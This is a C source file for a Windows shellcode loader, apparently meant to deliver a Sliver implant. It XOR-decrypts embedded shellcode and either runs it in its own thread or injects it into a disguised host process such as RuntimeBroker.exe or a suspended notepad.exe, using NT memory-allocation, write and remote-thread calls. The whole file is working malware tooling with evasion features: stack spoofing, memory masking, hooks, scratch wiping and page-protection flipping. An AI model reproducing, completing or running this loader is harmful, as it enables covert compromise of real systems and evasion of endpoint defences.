/* Main entry: go() runs at blob offset 0 (+gofirst). Sliver
 * variant: XOR-decrypt the embedded shellcode and thread-exec it
 * (no reflective PE loading). Contract with the spec:
 * - dll, mask sections are RESOURCE structs (preplen'd);
 * - pico section is the raw PICO blob (no preplen).
 * - mask section holds the XOR key (ignored under PALACE_NO_XOR).
 */
#include "loader.h"
#include "pico.h"
#include "services.h"

char _DLL_[0] __attribute__((section("dll")));
char _MASK_[0] __attribute__((section("mask")));
char _PICO_[0] __attribute__((section("pico")));

#ifndef PALACE_HOSTS
#define PALACE_HOSTS "RuntimeBroker.exe,SgrmBroker.exe,WerFault.exe,dllhost.exe,notepad.exe"
#endif

#ifdef PALACE_INJECT_HOST
static const char palace_hosts[] = PALACE_HOSTS;
#endif

static uint32_t loader_u32(const uint8_t *p) __attribute__((unused));
static uint32_t loader_u32(const uint8_t *p) {
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

static void loader_copy(uint8_t *dst, const uint8_t *src, size_t n) __attribute__((unused));
static void loader_copy(uint8_t *dst, const uint8_t *src, size_t n) {
    for (size_t i = 0; i < n; i++)
        dst[i] = src[i];
}

#ifdef PALACE_INJECT_HOST
/* Match one comma-separated entry against a process name. */
static int host_entry_matches(const char *hosts, int idx, const WCHAR *exe) {
    const char *p = hosts;
    for (int i = 0; i < idx; i++) {
        while (*p && *p != ',')
            p++;
        if (!*p)
            return 0;
        p++;
    }
    char name[64];
    int n = 0;
    while (*p && *p != ',' && n < 63)
        name[n++] = *p++;
    name[n] = 0;
    if (!n)
        return 0;
    return palace_ascii_iequals_w(name, exe);
}

static int host_entry_count(const char *hosts) {
    int n = 1;
    for (const char *p = hosts; *p; p++) {
        if (*p == ',')
            n++;
    }
    return n;
}

static uint16_t notepad_cmd[] = {'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', 0};

/* First preferred host found, else a suspended notepad fallback. */
static HANDLE find_host(void) {
    HANDLE snap = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != (HANDLE)(intptr_t)-1 && snap) {
        int count = host_entry_count(palace_hosts);
        for (int i = 0; i < count; i++) {
            PROCESSENTRY32W pe;
            pe.dwSize = sizeof(pe);
            if (!_Process32FirstW(snap, &pe))
                break;
            do {
                if (host_entry_matches(palace_hosts, i, pe.szExeFile)) {
                    HANDLE h = _OpenProcess(PROCESS_VM_ACCESS, 0, pe.th32ProcessID);
                    if (h) {
                        _CloseHandle(snap);
                        return h;
                    }
                }
            } while (_Process32NextW(snap, &pe));
        }
        _CloseHandle(snap);
    }
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    palace_zero(&si, sizeof(si));
    palace_zero(&pi, sizeof(pi));
    si.cb = sizeof(si);
    if (!_CreateProcessW(0, notepad_cmd, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi))
        return 0;
    _CloseHandle(pi.hThread);
    return pi.hProcess;
}
#endif

#ifdef PALACE_TEST_COUNT
int go(void *loader_arguments)
#else
void go(void *loader_arguments)
#endif
{
    (void)loader_arguments;
    int rounds = 0;
    if (!resolve_all())
        goto out;
    RESOURCE *dll = GETRESOURCE(_DLL_);
    RESOURCE *mask = GETRESOURCE(_MASK_);
    if (!dll->len || !mask->len)
        goto out;

    /* PICO setup (raw blob, no RESOURCE header). */
    void *pico_code = 0;
    int pico_mem_off = -1;
#ifndef PALACE_PICO_NONE
    {
        uint8_t *blob = (uint8_t *)&_PICO_;
        uint32_t total = loader_u32(blob);
        uint32_t nexp = total >= 8 ? loader_u32(blob + 4) : 0;
        int code_size = (total >= 8 && total <= 0x100000) ? pico_code_size(blob) : -1;
        int off_hooks = code_size > 0 ? pico_export_offset(blob, PICO_TAG_SETUP_HOOKS) : -1;
        pico_mem_off = code_size > 0 ? pico_export_offset(blob, PICO_TAG_SETUP_MEMORY) : -1;
        if (code_size > 0 && off_hooks >= 0) {
            const uint8_t *code = blob + 8 + 8 * nexp;
#ifdef PALACE_RWX
            pico_code = _VirtualAlloc(0, (SIZE_T)code_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (pico_code)
                loader_copy((uint8_t *)pico_code, code, (size_t)code_size);
#else
            pico_code = _VirtualAlloc(0, (SIZE_T)code_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (pico_code) {
                loader_copy((uint8_t *)pico_code, code, (size_t)code_size);
                ULONG old = 0;
                _VirtualProtect(pico_code, (SIZE_T)code_size, PAGE_EXECUTE_READ, &old);
            }
#endif
            if (pico_code) {
                cfg_register(pico_code, (size_t)code_size);
                ((void (*)(void))((uint8_t *)pico_code + off_hooks))();
            }
        }
    }
#endif

#ifdef PALACE_INJECT_HOST
    HANDLE proc = find_host();
    if (!proc)
        goto out_pico;
#ifdef PALACE_RWX
    ULONG rprot = PAGE_EXECUTE_READWRITE;
#else
    ULONG rprot = PAGE_READWRITE;
#endif
    PVOID remote = 0;
    SIZE_T rsize = dll->len;
    if (!NT_SUCCESS(_NtAllocateVirtualMemory(proc, &remote, 0, &rsize, MEM_COMMIT | MEM_RESERVE, rprot))) {
        _CloseHandle(proc);
        goto out_pico;
    }
    /* Decrypt into a local scratch buffer, write it in one call,
     * then wipe the scratch. */
    PVOID scratch = 0;
    SIZE_T ssize = dll->len;
    if (!NT_SUCCESS(_NtAllocateVirtualMemory((HANDLE)(intptr_t)-1, &scratch, 0, &ssize,
                                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
        PVOID rb = remote;
        SIZE_T rs = rsize;
        _NtFreeVirtualMemory(proc, &rb, &rs, MEM_RELEASE);
        _CloseHandle(proc);
        goto out_pico;
    }
    for (uint32_t i = 0; i < dll->len; i++) {
        uint8_t b = dll->value[i];
#ifndef PALACE_NO_XOR
        b ^= mask->value[i % mask->len];
#endif
        ((uint8_t *)scratch)[i] = b;
    }
    {
        SIZE_T done = 0;
        _NtWriteVirtualMemory(proc, remote, scratch, dll->len, &done);
    }
    cleanup_zero(scratch, (size_t)ssize);
    {
        PVOID sb = scratch;
        SIZE_T ss = ssize;
        _NtFreeVirtualMemory((HANDLE)(intptr_t)-1, &sb, &ss, MEM_RELEASE);
    }
#ifndef PALACE_RWX
    {
        ULONG oldp = 0;
        PVOID rbase = remote;
        SIZE_T rsz = rsize;
        _NtProtectVirtualMemory(proc, &rbase, &rsz, PAGE_EXECUTE_READ, &oldp);
    }
#endif
    HANDLE rthread = 0;
    _NtCreateThreadEx(&rthread, 0x1FFFFF, 0, proc, remote, 0, 0, 0, 0, 0, 0);
    if (rthread)
        _CloseHandle(rthread);
    _CloseHandle(proc);
    /* Loader exits; the shellcode lives in the host. */
#else
    /* Self mode: RW staging, decrypt, RX, thread-exec. */
    PVOID staging = 0;
    SIZE_T alloc_size = dll->len;
#ifdef PALACE_RWX
    ULONG prot = PAGE_EXECUTE_READWRITE;
#else
    ULONG prot = PAGE_READWRITE;
#endif
    if (!NT_SUCCESS(_NtAllocateVirtualMemory((HANDLE)(intptr_t)-1, &staging, 0, &alloc_size,
                                              MEM_COMMIT | MEM_RESERVE, prot)))
        goto out_pico;
    for (uint32_t i = 0; i < dll->len; i++) {
        uint8_t b = dll->value[i];
#ifndef PALACE_NO_XOR
        b ^= mask->value[i % mask->len];
#endif
        ((uint8_t *)staging)[i] = b;
    }
#ifndef PALACE_RWX
    {
        ULONG old = 0;
        PVOID base = staging;
        SIZE_T sz = alloc_size;
        _NtProtectVirtualMemory((HANDLE)(intptr_t)-1, &base, &sz, PAGE_EXECUTE_READ, &old);
    }
#endif
    cfg_register(staging, (size_t)alloc_size);
#ifdef PALACE_HOOKS
    hooks_install(staging, dll->len);
#endif
    HANDLE thread = 0;
    _NtCreateThreadEx(&thread, 0x1FFFFF, 0, (HANDLE)(intptr_t)-1, staging, 0, 0, 0, 0, 0, 0);
    if (thread) {
#ifdef PALACE_SPOOF
        spoof_enter();
#endif
        masked_join(thread, staging, dll->len, mask->value, mask->len, &rounds);
#ifdef PALACE_SPOOF
        spoof_leave();
#endif
        _CloseHandle(thread);
    }
    if (pico_code && pico_mem_off >= 0)
        ((void (*)(void))((uint8_t *)pico_code + pico_mem_off))();
#ifdef PALACE_CLEANUP
    secure_wipe(staging, (size_t)alloc_size);
#endif
    {
        PVOID base = staging;
        SIZE_T sz = alloc_size;
        _NtFreeVirtualMemory((HANDLE)(intptr_t)-1, &base, &sz, MEM_RELEASE);
    }
#ifdef PALACE_HOOKS
    hooks_remove();
#endif
#endif /* PALACE_INJECT_HOST */

out_pico:
#ifndef PALACE_PICO_NONE
    if (pico_code)
        _VirtualFree(pico_code, 0, MEM_RELEASE);
#endif
out:
#ifdef PALACE_TEST_COUNT
    return rounds;
#else
    (void)rounds;
#endif
}
